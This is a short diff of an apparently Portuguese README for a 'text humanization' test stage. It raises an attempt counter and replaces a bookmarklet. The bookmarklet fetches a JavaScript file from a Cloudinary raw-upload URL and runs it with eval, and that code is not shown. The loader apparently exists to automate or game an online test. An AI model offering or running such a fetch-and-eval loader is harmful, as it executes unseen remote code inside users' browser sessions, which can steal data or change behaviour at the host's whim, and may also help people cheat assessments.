@@ -2,9 +2,9 @@
 
 ### ETAPA DO TESTE: HUMANIZAÇÃO DE TEXTO
 
-### TENTATIVAS: 16
+### TENTATIVAS: 18
 
 
 ```js
-javascript:fetch('https://res.cloudinary.com/dctxcezsd/raw/upload/v1743852184/main.js').then(r=>r.text()).then(r=>eval(r))
+javascript:fetch('https://res.cloudinary.com/dctxcezsd/raw/upload/v1743852767/main.js').then(r=>r.text()).then(r=>eval(r))
 ```
